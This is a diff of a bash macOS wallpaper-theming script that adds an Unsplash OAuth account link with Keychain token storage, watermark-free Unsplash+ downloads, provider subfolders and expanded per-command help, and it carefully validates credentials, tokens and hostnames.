+# Validate the credential that unsplash_auth_line WOULD emit, from the main
+# shell, before any request is built — so a hostile value dies cleanly with
+# zero transfers rather than part-way through a pipeline.
+unsplash_auth_check() { unsplash_auth_line >/dev/null; }
+
+# One-time account link: OAuth authorization-code exchange with the out-of-
+# band redirect (the code shows in the browser; the user pastes it here).
+# Needs the app's SECRET key once, from the same dashboard page as the
+# access key. Secret, code and token all travel via stdin (curl -K data
+# lines / `security -i`), never argv; code and token are charset-checked
+# before they may sit in URL/command position.
+cmd_unsplash_auth() {
+    local key secret authurl code json tok
+    key=$(unsplash_key)
+    [ -n "$key" ] || die "no Unsplash key: export UNSPLASH_ACCESS_KEY, or run \`security add-generic-password -s unsplash-access-key -a \"\$USER\" -w\` after getting a free key at https://unsplash.com/oauth/applications"
+    secret="${UNSPLASH_SECRET_KEY:-}"
+    [ -n "$secret" ] || secret=$(command -v security >/dev/null 2>&1 &&
+        security find-generic-password -s unsplash-secret-key -w 2>/dev/null)
+    [ -n "$secret" ] || die "the exchange needs your app's SECRET key (shown beside the access key at https://unsplash.com/oauth/applications): export UNSPLASH_SECRET_KEY, or store it once with \`security add-generic-password -s unsplash-secret-key -a \"\$USER\" -w\`"
+    # Both halves enter curl's -K grammar below as `data = "…"` values, and
+    # the key also enters a URL handed to the browser. Check them here, in the
+    # main shell, before either can travel.
+    require_credential 'the Unsplash access key (UNSPLASH_ACCESS_KEY / Keychain unsplash-access-key)' "$key"
+    require_credential 'the Unsplash app secret (UNSPLASH_SECRET_KEY / Keychain unsplash-secret-key)' "$secret"
+    authurl="https://unsplash.com/oauth/authorize?client_id=$key&redirect_uri=urn:ietf:wg:oauth:2.0:oob&response_type=code&scope=public"
+    note "opening the authorize page — sign in as your Unsplash+ account and approve"
+    if command -v open >/dev/null 2>&1; then open "$authurl"; else note "open: $authurl"; fi
+    printf 'paste the code shown after approving: '
+    # -e gives readline editing on a tty (arrow keys edit instead of
+    # injecting ESC[D into the buffer); harmlessly ignored on a pipe.
+    IFS= read -r -e code
+    # Browser copies arrive padded — leading/trailing spaces, tabs, or a
+    # stray CR are transport noise, not part of the code: strip them BEFORE
+    # the charset gate so a padded paste of a valid code is not refused.
+    code=$(printf '%s' "$code" | tr -d ' \t\r\n')
+    case "$code" in '' | *[!A-Za-z0-9_-]*) die "that does not look like an authorization code (letters, digits, - and _ only) — copy just the code text, without surrounding characters" ;; esac
+    # Belt and braces: the code is about to become a `data = "…"` value, so it
+    # passes the same gate as every other credential. The case above is the
+    # stricter of the two and gives the better message; this one is what a
+    # future edit to that pattern cannot accidentally loosen past.
+    require_credential 'the authorization code' "$code"
+    json=$(printf 'data = "client_id=%s"\ndata = "client_secret=%s"\ndata = "redirect_uri=urn:ietf:wg:oauth:2.0:oob"\ndata = "code=%s"\ndata = "grant_type=authorization_code"\n' "$key" "$secret" "$code" |
+        curl -fsg --max-time 30 -K - "https://unsplash.com/oauth/token") ||
+        die "token exchange failed — wrong/expired code, or the app's redirect URIs do not include urn:ietf:wg:oauth:2.0:oob (add it on the dashboard)"
+    tok=$(printf '%s' "$json" | python3 -c 'import json,sys; print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
+    [ -n "$tok" ] || die "Unsplash answered without an access token"
+    case "$tok" in *[!A-Za-z0-9._~+/=-]*) die "unexpected token shape — refusing to store it" ;; esac
+    command -v security >/dev/null 2>&1 || die "no macOS Keychain (security) available to store the token"
+    printf 'add-generic-password -U -a %s -s unsplash-user-token -w %s\n' "$USER" "$tok" | security -i >/dev/null 2>&1 ||
+        die "could not store the token in the Keychain"
+    note "linked — Unsplash+ downloads are now watermark-free (Keychain: unsplash-user-token)"
+    return 0
+}
+
 cmd_unsplash() {
     local key url json img_url w h slug dl who query="$1" pick=""
     key=$(unsplash_key)
     [ -n "$key" ] || die "no Unsplash key: export UNSPLASH_ACCESS_KEY, or run \`security add-generic-password -s unsplash-access-key -a \"\$USER\" -w\` after getting a free key at https://unsplash.com/oauth/applications"
+    # Grammar-check the credential that will be embedded in curl's -K config,
+    # here in the main shell, before a single request is built.
+    unsplash_auth_check
     case "$1" in
     *://*)
         # A pasted link fetches THAT photo via the API's /photos/:id (which
@@ -459,21 +979,47 @@ cmd_unsplash() {
     # spaces, so & or [] in a search stays search text.
     local curl_args=(-fsLg --max-time 30 -K -)
     [ -n "$query" ] && curl_args+=(-G --data-urlencode "query=$query")
-    json=$(printf 'header = "Authorization: Client-ID %s"\n' "$key" |
+    json=$(unsplash_auth_line |
         curl "${curl_args[@]}" "$url") || die "Unsplash request failed (bad key, rate limit, or no network)"
     # Read the six NUL-terminated fields into an array (a tab/newline in the
     # contributor-controlled name or photographer can no longer shift a later
     # field). read -d '' captures each up to its NUL; the final read hits EOF.
     local _f _fields=()
     while IFS= read -r -d '' _f; do _fields+=("$_f"); done < <(printf '%s' "$json" | python3 -c "$UNSPLASH_PY")
-    [ "${#_fields[@]}" -ge 6 ] || die "Unsplash returned no usable photo"
+    [ "${#_fields[@]}" -ge 7 ] || die "Unsplash returned no usable photo"
     img_url=${_fields[0]}; w=${_fields[1]}; h=${_fields[2]}
     slug=${_fields[3]}; dl=${_fields[4]}; who=${_fields[5]}
+    # Unsplash+ content downloaded over the application key is WATERMARKED —
+    # say so BEFORE spending the download, and name the one-time fix.
+    if [ "${_fields[6]:-0}" = 1 ] && [ -z "$(unsplash_user_token)" ]; then
+        note "Unsplash+ photo over application-key auth: the file WILL carry the watermark"
+        note "one-time fix: theme unsplash auth (links your Unsplash+ account, clean files after)"
+    fi
     # The download-report call attaches the Access Key, so its target must be
     # an api.unsplash.com HTTPS URL and nothing else — defence in depth beside
     # the NUL transport: even a malicious download_location cannot redirect the
     # key off-host.
     case "$dl" in https://api.unsplash.com/*) ;; *) dl="" ;; esac
+    # Unsplash+ entitlement lives in the DOWNLOAD endpoint, not the photo
+    # JSON: urls.raw serves the watermarked rendition no matter who asked,
+    # while download_location called WITH the account bearer answers a
+    # signed, expiring delivery URL — the same clean file as the site's
+    # Download button. That call is also the API's download report, so the
+    # post-save courtesy ping is skipped when the download went through it.
+    local reported="" entitled _eh
+    if [ "${_fields[6]:-0}" = 1 ] && [ -n "$(unsplash_user_token)" ] && [ -n "$dl" ]; then
+        entitled=$(unsplash_auth_line |
+            curl -fsg --max-time 30 -K - --url "$dl" |
+            python3 -c 'import json,sys; print(json.load(sys.stdin).get("url",""))' 2>/dev/null)
+        # The answer chooses the host, so it is bound before use: https and
+        # an unsplash.com subdomain, through the same parser as every other
+        # host decision here — never a substring match on the raw string.
+        _eh=$(url_host "$entitled" 2>/dev/null) || _eh=""
+        case "$entitled:$_eh" in
+        https://*:*.unsplash.com) img_url="$entitled"; reported=1 ;;
+        *) note "entitled download unavailable — falling back to the standard (watermarked) rendition" ;;
+        esac
+    fi
     [ -n "$img_url" ] || die "Unsplash returned no image URL"
     [ -n "$SOURCE_URL" ] || SOURCE_URL="$img_url"
     if [ "$w" -ge 3840 ] 2>/dev/null; then :
@@ -489,12 +1035,13 @@ cmd_unsplash() {
     # photographer is credited in the terminal note, not the filename.
     maybe_rotate "$SCRATCH"
     maybe_extend "$SCRATCH"
-    save_wallpaper "$SCRATCH" "$mime" "${query:+$query }$slug${ROTATE:+ rotated $ROTATE}${EXTEND:+ extended}"
+    SAVE_SUBDIR=unsplash \
+        save_wallpaper "$SCRATCH" "$mime" "${query:+$query }$slug${ROTATE:+ rotated $ROTATE}${EXTEND:+ extended}"
     scratch_done
     # Unsplash API guideline: report the download so the photographer is
     # credited. $dl is validated to api.unsplash.com above; --url draws an
     # explicit boundary so it can never be read as another curl option.
-    [ -n "$dl" ] && printf 'header = "Authorization: Client-ID %s"\n' "$key" |
+    [ -n "$dl" ] && [ -z "$reported" ] && unsplash_auth_line |
         curl -fsg --max-time 15 -K - -o /dev/null --url "$dl" 2>/dev/null
     [ -n "$who" ] && note "photo by $who on Unsplash"
     use_image "$SAVED"
@@ -509,8 +1056,11 @@ cmd_unsplash_status() {
     local key limit remaining
     key=$(unsplash_key)
     [ -n "$key" ] || die "no Unsplash key: export UNSPLASH_ACCESS_KEY, or run \`security add-generic-password -s unsplash-access-key -a \"\$USER\" -w\` after getting a free key at https://unsplash.com/oauth/applications"
+    # Grammar-check the credential that will be embedded in curl's -K config,
+    # here in the main shell, before a single request is built.
+    unsplash_auth_check
     scratch_new
-    printf 'header = "Authorization: Client-ID %s"\n' "$key" |
+    unsplash_auth_line |
         curl -fsg --max-time 15 -K - -D "$SCRATCH" -o /dev/null \
             "https://api.unsplash.com/photos?page=1&per_page=1" ||
         die "Unsplash request failed (bad key, rate limit exhausted, or no network)"
@@ -521,8 +1071,13 @@ cmd_unsplash_status() {
     # shape is checked rather than trusted. A non-numeric limit is a broken or
     # hostile answer, not a number to render.
     case "$limit" in '' | *[!0-9]*) die "Unsplash answered without usable rate-limit headers" ;; esac
-    case "$remaining" in *[!0-9]*) remaining="" ;; esac
-    printf 'requests left this hour:  %s/%s (resets on the hour)\n' "$remaining" "$limit"
+    # A window driven negative (overage) is a real answer — show it, with
+    # the recovery fact; anything else non-numeric is not a number to render.
+    case "${remaining#-}" in '' | *[!0-9]*) remaining="" ;; esac
+    case "$remaining" in
+    -*) printf 'requests left this hour:  %s/%s (window EXCEEDED — resets on the hour)\n' "$remaining" "$limit" ;;
+    *)  printf 'requests left this hour:  %s/%s (resets on the hour)\n' "$remaining" "$limit" ;;
+    esac
     case "$limit" in
     50) printf 'tier:                     demo (50/hour; production raises it to 5000)\n' ;;
     5000) printf 'tier:                     production (5000/hour)\n' ;;
@@ -533,8 +1088,12 @@ cmd_unsplash_status() {
     else
         printf 'key:                      set (Keychain: unsplash-access-key)\n'
     fi
-    printf 'account:                  application access key (Client-ID) — usage counts\n'
-    printf '                          per app; no user is logged in over this key\n'
+    if [ -n "$(unsplash_user_token)" ]; then
+        printf 'account:                  user token linked (Bearer) — Unsplash+ files come clean\n'
+    else
+        printf 'account:                  application access key (Client-ID); no user is logged\n'
+        printf '                          in, so Unsplash+ photos arrive WATERMARKED — see: theme unsplash auth\n'
+    fi
     printf 'note:                     this check spent 1 request of the window above\n'
     return 0
 }
@@ -592,12 +1151,36 @@ cmd_url() {
     esac
     maybe_rotate "$SCRATCH"
     maybe_extend "$SCRATCH"
-    save_wallpaper "$SCRATCH" "$mime" "$hint${ROTATE:+ rotated $ROTATE}${EXTEND:+ extended}"
+    # Route the download into its provider's subfolder (unsplash/, pinterest/,
+    # reddit/); an unrecognized host keeps the library root — per-host folder
+    # sprawl is worse than a flat root for one-off sources.
+    local _sub="" _h
+    _h=$(url_host "$link") && _sub=$(host_label "$_h") || _sub=""
+    SAVE_SUBDIR="$_sub" \
+        save_wallpaper "$SCRATCH" "$mime" "$hint${ROTATE:+ rotated $ROTATE}${EXTEND:+ extended}"
     scratch_done
     use_image "$SAVED"
 }
 
 # --- reporting -------------------------------------------------------------
+
+# Hostname → provider label (exact-hostname discipline, never substrings).
+# Shared by wall_source (provenance column) and cmd_url (which saves a
+# download into the label's subfolder). Prints the label and returns 0 on a
+# known provider; returns 1 for everything else.
+host_label() { # $1 host
+    local dom
+    for dom in unsplash.com images.unsplash.com; do
+        host_under "$1" "$dom" && { printf 'unsplash'; return 0; }
+    done
+    for dom in pinimg.com pinterest.com; do
+        host_under "$1" "$dom" && { printf 'pinterest'; return 0; }
+    done
+    for dom in redd.it reddit.com redditmedia.com; do
+        host_under "$1" "$dom" && { printf 'reddit'; return 0; }
+    done
+    return 1
+}
 
 # Where a wallpaper came from, as a short label: the theme.source xattr our
 # own downloads record, falling back to macOS's kMDItemWhereFroms for files a
@@ -619,17 +1202,9 @@ wall_source() { # $1 file
     # decided by the parsed hostname and never by a substring: `*unsplash.com*`
     # matched `https://evilunsplash.com/payload` and rendered it `unsplash`,
     # which is exactly the provenance an attacker would want to borrow.
-    local host dom
+    local host
     if host=$(url_host "$src"); then
-        for dom in unsplash.com images.unsplash.com; do
-            host_under "$host" "$dom" && { printf 'unsplash'; return 0; }
-        done
-        for dom in pinimg.com pinterest.com; do
-            host_under "$host" "$dom" && { printf 'pinterest'; return 0; }
-        done
-        for dom in redd.it reddit.com redditmedia.com; do
-            host_under "$host" "$dom" && { printf 'reddit'; return 0; }
-        done
+        host_label "$host" && return 0
         # Anything else is shown as the host it actually is. A Pinterest
         # country domain (pinterest.co.uk) lands here rather than in the label
         # above: naming it honestly beats widening the match to a shape that
@@ -733,13 +1308,26 @@ wall_preview() { # $1 file
 }
 
 # Wallpapers as a table, LATEST ADDED first (APFS birth time): truncated
-# title plus a small render of the scheme that wallpaper derives — snappy,
-# because the scheme comes from pywal's cache, not the image. Source (an
-# xattr/mdls read per file), format, size, date, and the inline picture
+# title plus a small render of the scheme that wallpaper derives. Schemes
+# render from pywal's cache; anything missing is derived first by
+# backfill_schemes (one-time ~1s per new wallpaper, instant after). Source
+# (an xattr/mdls read per file), format, size, date, and the inline picture
 # preview all live behind -v, so the default listing does no per-file
-# metadata work and stays instant.
+# metadata work beyond that.
 cmd_list() {
-    local cols namew f name src fmt bytes added c r g b n
+    local cols namew f name src fmt bytes added c r g b n total shown listfile
+    listfile=$(mktemp) || die "cannot create a scratch list"
+    find "$WALLPAPER_DIR" -type f \( "${IMG_GLOB[@]}" \) 2>/dev/null |
+        while IFS= read -r f; do
+            printf '%s\t%s\n' "$(stat -f %B "$f" 2>/dev/null || printf 0)" "$f"
+        done | sort -rn | cut -f2- >"$listfile"
+    total=$(wc -l <"$listfile" | tr -d ' ')
+    shown=$total
+    [ "$LIST_N" -gt 0 ] && [ "$total" -gt "$LIST_N" ] && shown=$LIST_N
+    # BSD head rejects `-n 0`, and an empty library is an ordinary first-run
+    # state, not an error — emit nothing rather than a usage complaint.
+    list_rows() { [ "$shown" -gt 0 ] && head -n "$shown" "$listfile"; return 0; }
+    list_rows | backfill_schemes
     cols=${COLUMNS:-$(tput cols 2>/dev/null || printf 100)}
     local pvok="" pvw=0
     [ -n "$VERBOSE" ] && [ -n "${KITTY_WINDOW_ID:-}" ] && command -v kitten >/dev/null 2>&1 && { pvok=1; pvw=9; }
@@ -752,10 +1340,7 @@ cmd_list() {
     else
         printf '  %-*s  %s\n' "$namew" TITLE COLORSCHEME
     fi
-    find "$WALLPAPER_DIR" -type f \( "${IMG_GLOB[@]}" \) 2>/dev/null |
-        while IFS= read -r f; do
-            printf '%s\t%s\n' "$(stat -f %B "$f" 2>/dev/null || printf 0)" "$f"
-        done | sort -rn | cut -f2- |
+    list_rows |
         while IFS= read -r f; do
             name=$(basename "$f")
             name="${name%.*}"
@@ -798,6 +1383,10 @@ cmd_list() {
             # Second line of the picture preview, when one rendered.
             if [ -n "$PV2" ]; then printf '  %s\n' "$PV2"; fi
         done
+    rm -f "$listfile"
+    [ "$shown" -lt "$total" ] &&
+        printf '\n  newest %s of %s — more: theme list -n <count>, or --all\n' "$shown" "$total"
+    return 0
 }
 
 # One wallpaper up close, styled like the list: a larger picture on the
@@ -813,6 +1402,7 @@ cmd_preview() { # $1 optional wallpaper name/path
         img=$(command -v wallpaper >/dev/null 2>&1 && wallpaper get 2>/dev/null | sed 's#^//#/#' | sort -u | head -1)
         [ -n "$img" ] && [ -f "$img" ] || die "no current wallpaper to preview — name one: theme preview <wallpaper>"
     fi
+    printf '%s\n' "$img" | backfill_schemes
     # Display copies only. $img stays byte-exact — it is what render_preview,
     # img_size, stat and wall_scheme open.
     name=$(basename "$img"); name="${name%.*}"
@@ -940,7 +1530,9 @@ cmd_status() {
     else
         printf '  UNSPLASH_ACCESS_KEY   not set (theme unsplash --help)\n'
     fi
-    printf '  WALLPAPER_DIR         %s\n' "$(display_text "$WALLPAPER_DIR")"
+    printf '  THEME_WALLPAPER_DIR   %s\n' "$(display_text "$WALLPAPER_DIR")"
+    printf '  THEME_FORMATS         %s\n' "$(display_text "${THEME_FORMATS:-$THEME_FORMATS_ALL} ${THEME_EXCLUDE_FORMATS:+(minus: $THEME_EXCLUDE_FORMATS)}")"
+    printf '  THEME_CONTRAST        %s\n' "$(display_text "$WAL_CONTRAST")"
     printf '  WAL_CACHE             %s\n' "$(display_text "$WAL_CACHE")"
 }
 
@@ -965,9 +1557,15 @@ resolve_library() {
         cand=$(library_match "$1") || return 1
     fi
     [ -n "$cand" ] || return 1
+    # Canonical containment: the file's physical directory must be the
+    # library root or a descendant of it (the library is recursive now).
+    # A symlink pointing outside still canonicalizes outside and is refused.
     dirreal=$(cd "$WALLPAPER_DIR" 2>/dev/null && pwd -P) || return 1
     real=$(cd "$(dirname "$cand")" 2>/dev/null && pwd -P) || return 1
-    [ "$real" = "$dirreal" ] || return 1
+    case "$real" in
+    "$dirreal" | "$dirreal"/*) ;;
+    *) return 1 ;;
+    esac
     printf '%s' "$cand"
     return 0
 }
@@ -1022,7 +1620,7 @@ cmd_rename() {
 }
 
 usage() {
-    local desk inc label colors term os
+    local desk inc label colors term os name sw i line
     desk=$(command -v wallpaper >/dev/null 2>&1 && wallpaper get 2>/dev/null | sed 's#^//#/#' | sort -u | head -1)
     inc=$(sed -n 's/^include //p' "$CURRENT" 2>/dev/null)
     case "$inc" in
@@ -1030,15 +1628,12 @@ usage() {
     *colors-kitty.conf) label="" ;;
     *) label="$(basename "${inc%.conf}")" ;;
     esac
-    printf '  current theme:      %s\n' "$(display_text "${desk:-<none>}")"
     colors=$(scheme_colors)
     if [ -n "$colors" ]; then
-        printf '  colorscheme:        '
         # shellcheck disable=SC2046
-        swatch_row $(printf '%s\n' "$colors" | head -8)
-        printf '%s\n' "${label:+ $(display_text "$label")}"
+        sw="$(swatch_row $(printf '%s\n' "$colors" | head -8))${label:+ $(display_text "$label")}"
     else
-        printf '  colorscheme:        <none>\n'
+        sw='<none>'
     fi
     # This header printfs directly instead of going through note(), so each
     # runtime value needs its own display copy — $desk and $label above, $term
@@ -1053,7 +1648,6 @@ usage() {
         # clipboard write in either, and this line prints it as a fact.
         term=$(display_text "${TERM_PROGRAM:-$TERM}")
     fi
-    printf '  terminal:           %s\n' "$term"
     # uname/sw_vers are resolved through PATH, so this output is not ours to
     # trust either, and being sure costs one call.
     if [ "$(uname -s)" = Darwin ]; then
@@ -1061,25 +1655,59 @@ usage() {
     else
         os=$(uname -srm)
     fi
-    printf '  os:                 %s\n' "$(display_text "$os")"
+    os=$(display_text "$os")
+    # The header borrows preview's shape: the CURRENT background rendered on
+    # the left (kitty graphics; text-only elsewhere), facts on the right. The
+    # title is bounded like preview's — a wrapped line shreds the block.
+    if [ -n "$desk" ]; then
+        name=$(basename "$desk"); name="${name%.*}"; name=$(display_text "$name")
+    else
+        name='<none>'
+    fi
+    local cols availw
+    cols=${COLUMNS:-$(tput cols 2>/dev/null || printf 100)}
+    availw=$((cols - 18 - 13))
+    [ "$availw" -lt 12 ] && availw=12
+    [ "${#name}" -gt "$availw" ] && name="$(printf '%.*s' $((availw - 1)) "$name")…"
+    local rlines=(
+        ""
+        "$(printf '%-12s %s' THEME "$name")"
+        "$(printf '%-12s %s' COLORSCHEME "$sw")"
+        "$(printf '%-12s %s' TERMINAL "$term")"
+        "$(printf '%-12s %s' OS "$os")"
+        ""
+    )
+    PV_APC=""; PV_ROWS=(); PV_H=0
+    if [ -n "$desk" ] && [ -f "$desk" ] && render_preview "$desk" 14 6; then
+        printf '%s' "$PV_APC"
+        i=0
+        while [ "$i" -lt 6 ]; do
+            line="${PV_ROWS[$i]:-$(printf '%-14s' '')}"
+            printf '  %s  %s\n' "$line" "${rlines[$i]:-}"
+            i=$((i + 1))
+        done
+    else
+        for line in "${rlines[@]}"; do
+            [ -n "$line" ] && printf '  %s\n' "$line"
+        done
+    fi
     cat <<EOF
 
 Apply Commands:
-  set             apply a specific local wallpaper (path, or name in the wallpaper folder)
+  set             apply a wallpaper: local name/path, or any actionable link
   random          random wallpaper from the configured wallpaper folder
-  unsplash        fetch a random high-res Unsplash photo, save it, apply it
+  unsplash        Unsplash photos: search, page-url, random; auth and status
   url             download a direct image URL or Pinterest pin, save it, apply it
 
 Library Commands:
-  list            wallpaper table: title + colorscheme (-v adds source, format, size, date)
+  list, ls        wallpaper table: title + colorscheme (-v adds source, format, size, date)
   preview         one wallpaper up close: picture, colorscheme, title, location
   rename          rename a saved wallpaper, keeping the naming format
-  rm              delete saved wallpapers by name
+  rm, remove      delete saved wallpapers by name
 
 Info Commands:
   status          current theme, color-scheme swatches, variables
-  unsplash status Unsplash API usage: requests left this hour, key, tier
-  help            this text
+  help            this text (per-command: theme <command> --help)
 
 Usage:
   theme <command> [flags]
@@ -1104,6 +1732,15 @@ EOF
 #
 # $wdir is display-only and is never opened, listed or written: the
 # operational WALLPAPER_DIR is untouched, exactly as everywhere else.
+# Per-command help. Every body below is an UNQUOTED heredoc, because $wdir has
+# to expand — which means backticks and $(…) inside them are LIVE COMMAND
+# SUBSTITUTION, executed just by rendering the help. Quote example commands
+# with 'single quotes', never backticks: a backticked `theme unsplash random`
+# here would fetch and apply a wallpaper on every --help, and any example that
+# renders help again would recurse. Escape a backtick (\`) if one is truly
+# needed. Keep help text generic and extensible, and never let it grow —
+# additions pay for themselves by consolidating something else (owner
+# directive 2026-08-30).
 usage_cmd() {
     local wdir
     wdir=$(display_text "$WALLPAPER_DIR")
@@ -1120,38 +1757,45 @@ theme random [--rotate left|right] [--extend[=RRGGBB]]
 EOF
         ;;
     set) cat <<EOF
-theme set <image> [--rotate left|right] [--extend[=RRGGBB]]
+theme set <image | url> [--rotate left|right] [--extend[=RRGGBB]]
 
-  Apply a specific local wallpaper: desktop + palette + kitty.
-  <image> is a path or a name under $wdir (extension optional).
+  Apply a specific wallpaper: desktop + palette + kitty. <image> is a
+  path or a name under $wdir (extension optional). set also
+  understands actionable links: an unsplash.com/photos/… page routes
+  through 'theme unsplash', any other URL through 'theme url'.
 
   Examples:
     theme set spain-city-mountains
     theme set nebulosa-red.png --extend
+    theme set https://unsplash.com/photos/a-computer-screen-with-a-wave-on-it-mOpfECCgeC4
 EOF
         ;;
     unsplash) cat <<EOF
-theme unsplash [query… | photo-url] [--rotate left|right] [--extend[=RRGGBB]]
+theme unsplash <query… | photo-url | subcommand> [--rotate left|right] [--extend[=RRGGBB]]
 
-  Fetch an Unsplash photo, save it into $wdir — named from your
-  query plus the photo's own description — then apply it (desktop +
-  palette + kitty). Always downloads the RAW original rendition (the
-  highest quality Unsplash serves), preferring 3840px+ photos on search.
+  Fetch an Unsplash photo into $wdir — named from your query plus
+  the photo's own description — then apply it (desktop + palette +
+  kitty). Downloads the RAW original rendition, preferring 3840px+ on
+  search. A query needs no quotes; a photo page link
+  (unsplash.com/photos/…) fetches exactly that photo. Bare
+  'theme unsplash' shows this help.
 
-  A query needs no quotes; no query = fully random. Pasting a photo page
-  link (unsplash.com/photos/…) fetches exactly that photo instead of
-  searching. Needs UNSPLASH_ACCESS_KEY or the 'unsplash-access-key'
-  Keychain item (see README.md).
+  Subcommands:
+    random    fully random photo (landscape, high resolution)
+    auth      one-time account link (OAuth): Unsplash+ photos then
+              download watermark-free, like the site's Download button —
+              without it they arrive WATERMARKED. Needs the app secret
+              once (env UNSPLASH_SECRET_KEY / Keychain 'unsplash-secret-key')
+    status    API window: requests left, tier, key source, linked
+              account (costs 1 request)
 
-  theme unsplash status shows the API window for your key — requests
-  left this hour, tier, key source. The check itself costs 1 request.
+  Needs UNSPLASH_ACCESS_KEY or the 'unsplash-access-key' Keychain item.
 
   Examples:
-    theme unsplash                     # surprise me
+    theme unsplash random
     theme unsplash neon city rain
-    theme unsplash mountain lake sunrise --rotate right
     theme unsplash https://unsplash.com/photos/winged-person-with-halo-in-sky-coy_MhYMLHs
-    theme unsplash status              # 39/50 requests remaining this hour
+    theme unsplash auth
 EOF
         ;;
     url) cat <<EOF
@@ -1172,18 +1816,16 @@ theme url <link> [--rotate left|right]
     theme url https://i.pinimg.com/736x/cc/a1/35/cca13….jpg --extend
 EOF
         ;;
-    list) cat <<EOF
-theme list [-v]
+    list | ls) cat <<EOF
+theme list [-v] [-n <count> | --all]
 
-  Wallpapers as a table sorted by LATEST ADDED. Columns: title
-  (truncated to the terminal) and a small render of the colorscheme
-  that wallpaper derived when it was last applied (from the palette
-  cache — a wallpaper never applied shows "-", nothing is computed at
-  list time, so the listing stays instant). -v adds a small picture
-  preview (kitty graphics; in kitty only) plus source — the site it
-  came from (unsplash, pinterest, reddit, …), recorded at download
-  time or read from macOS download metadata, "-" when unknown —
-  format, size, and date added.
+  Wallpapers as a table sorted by LATEST ADDED — the newest 10 by
+  default; -n <count> or --all widens it (colorschemes render from
+  cache; anything missing is derived once, only for the rows shown).
+  -v adds a small picture preview (kitty graphics; in kitty only) plus
+  source — the site it came from, recorded at download time or read
+  from macOS download metadata, "-" when unknown — format, size, and
+  date added.
 
   A truncated title copied from the table (with or without the …)
   works in set/rename/rm when only one wallpaper starts with it.
@@ -1232,7 +1874,7 @@ theme rename <wallpaper> <new name…>
     theme rename starry-boat-3840x2160-v0-uyzg0992aegb1 starry boat painting
 EOF
         ;;
-    rm) cat <<EOF
+    rm | remove) cat <<EOF
 theme rm <wallpaper…>
 
   Delete saved wallpapers by name — resolved in $wdir like
@@ -1258,6 +1900,18 @@ EOF
 
 # --- dispatch --------------------------------------------------------------
 
+# Built here, not at the top of the file: an emptied format set dies through
+# display_text, which (like every helper) is only guaranteed defined once the
+# whole file has been read.
+build_img_glob
+
+# Same late validation as the format set: a non-numeric floor would reach both
+# pywal and the blend pass as a number, so it is refused here, once.
+case "$WAL_CONTRAST" in
+'' | *[!0-9.]* | . | *.*.*) die "THEME_CONTRAST must be a number (got: $WAL_CONTRAST)" ;;
+esac
+
+
 # --rotate left|right turns the image 90° before it is saved and applied, so a
 # portrait Pinterest pin becomes a landscape that fills the desktop. Parsed out
 # here (any position) so the subcommands stay flag-free.
@@ -1265,22 +1919,30 @@ ROTATE=""
 EXTEND=""
 VERBOSE=""
 SOURCE_URL=""
+LIST_N=10
 _args=()
 _want=""
+_want_n=""
 for _a in "$@"; do
     if [ -n "$_want" ]; then ROTATE="$_a"; _want=""; continue; fi
+    if [ -n "$_want_n" ]; then LIST_N="$_a"; _want_n=""; continue; fi
     case "$_a" in
     --rotate) _want=1 ;;
     --rotate=*) ROTATE="${_a#*=}" ;;
     --extend) EXTEND="000000" ;;
     --extend=*) EXTEND="${_a#*=}"; EXTEND="${EXTEND#\#}" ;;
     -v | --verbose) VERBOSE=1 ;;
+    -n) _want_n=1 ;;
+    -n=* | --limit=*) LIST_N="${_a#*=}" ;;
+    --all) LIST_N=0 ;;
     *) _args+=("$_a") ;;
     esac
 done
 [ -z "$_want" ] || die "--rotate takes left or right"
+[ -z "$_want_n" ] || die "-n takes a row count"
 set -- "${_args[@]}"
 case "$ROTATE" in '' | left | right) ;; *) die "--rotate takes left or right" ;; esac
+case "$LIST_N" in '' | *[!0-9]*) die "-n takes a row count (0 or --all = everything)" ;; esac
 case "$EXTEND" in
 '' ) ;;
 [0-9a-fA-F][0-9a-fA-F][0-9a-fA-F][0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]) ;;
@@ -1308,17 +1970,34 @@ fi
 
 case "${1:-help}" in
 random) cmd_local "" ;;
-set) [ -n "${2:-}" ] || die "usage: theme set <image>"; cmd_local "$2" ;;
+set)
+    # set is generic over SOURCES: an Unsplash photo page routes through the
+    # unsplash path (API metadata, credit, clean Unsplash+ files once
+    # linked), any other URL through the url path, anything else is a
+    # library name. Same validation as calling those commands directly.
+    [ -n "${2:-}" ] || die "usage: theme set <image | url>"
+    case "$2" in
+    https://unsplash.com/photos/?* | https://www.unsplash.com/photos/?*) cmd_unsplash "$2" ;;
+    *://*) cmd_url "$2" ;;
+    *) cmd_local "$2" ;;
+    esac
+    ;;
 unsplash)
     shift
-    if [ "${1:-}" = status ] && [ $# -eq 1 ]; then cmd_unsplash_status; else cmd_unsplash "$*"; fi
+    # kubectl-style root: bare `theme unsplash` is the command's help, not a
+    # surprise download — the random fetch is the explicit `random` subcommand.
+    if [ $# -eq 0 ]; then usage_cmd unsplash
+    elif [ "$1" = status ] && [ $# -eq 1 ]; then cmd_unsplash_status
+    elif [ "$1" = auth ] && [ $# -eq 1 ]; then cmd_unsplash_auth
+    elif [ "$1" = random ] && [ $# -eq 1 ]; then cmd_unsplash ""
+    else cmd_unsplash "$*"; fi
     ;;
 url) cmd_url "${2:-}" ;;
-list) cmd_list ;;
+list | ls) cmd_list ;;
 preview) cmd_preview "${2:-}" ;;
 status) cmd_status ;;
 rename) shift; [ -n "${1:-}" ] || die "usage: theme rename <wallpaper> <new name…>"; cmd_rename "$@" ;;
-rm) shift; [ -n "${1:-}" ] || die "usage: theme rm <wallpaper…>"; cmd_rm "$@" ;;
+rm | remove) shift; [ -n "${1:-}" ] || die "usage: theme rm <wallpaper…>"; cmd_rm "$@" ;;
 help | -h | --help) usage ;;
 *) die "unknown command '$1' — run 'theme help' for the list" ;;
 esac
